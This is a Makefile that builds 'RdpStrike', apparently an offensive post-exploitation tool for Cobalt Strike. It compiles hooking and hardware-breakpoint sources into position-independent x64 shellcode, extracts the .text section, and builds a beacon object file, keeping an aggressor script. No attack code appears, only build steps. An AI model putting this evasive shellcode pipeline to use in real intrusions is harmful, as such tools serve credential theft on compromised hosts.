NAME := RdpStrike
CCX64 := x86_64-w64-mingw32-gcc
PY := python3
NASM := nasm
DIST := dist
SRC := src
CFLAGS := -Os -fno-asynchronous-unwind-tables -nostdlib -fno-ident -fpack-struct=8 -Iinclude
CFLAGS += -falign-functions=1 -s -ffunction-sections -falign-jumps=1 -w -falign-labels=1 -mrdrnd
CFLAGS += -fPIC -Wl,-Tscripts/linker.ld -Wl,-s,--no-seh,--enable-stdcall-fixup -masm=intel -fpermissive

all: clean shellcode-x64 readfile-x64

shellcode-x64:
	@ $(NASM) -f win64 $(SRC)/asm/$(NAME).asm -o $(DIST)/$(NAME).asm.o 						# Compile Stager.asm
	@ $(CCX64) -o $(DIST)/main.o -c $(SRC)/main.c $(CFLAGS) $(CUSTOMIZE_CFLAGS)  			# Compile main.c
	@ $(CCX64) -o $(DIST)/utils.o -c $(SRC)/utils.c $(CFLAGS) $(CUSTOMIZE_CFLAGS)     		# compile utils.c
	@ $(CCX64) -o $(DIST)/hooks.o -c $(SRC)/hooks.c $(CFLAGS) $(CUSTOMIZE_CFLAGS)     		# compile hooks.c
	@ $(CCX64) -o $(DIST)/hwbp.o -c $(SRC)/hwbp.c $(CFLAGS) $(CUSTOMIZE_CFLAGS)     		# compile hwbp.c
	@ $(CCX64) $(DIST)/*.o -o $(DIST)/$(NAME).x64.exe $(CFLAGS)								# link it
	@ $(PY) scripts/script.py -f $(DIST)/$(NAME).x64.exe -o $(DIST)/$(NAME).x64.bin			# extract .text
	@ rm -rf $(DIST)/*.o																	# clean object files
	@ rm -rf $(DIST)/$(NAME).x64.exe														# clean executable

readfile-x64:
	@ $(CCX64) -o $(DIST)/ReadFile.x64.o -c $(SRC)/bof/ReadFile.c 							# compile ReadFile.c


clean:
	@ cd $(DIST)/; find . -mindepth 1 ! -name "RdpStrike.cna" -exec rm -rv {} +				# clean everything except aggressor script

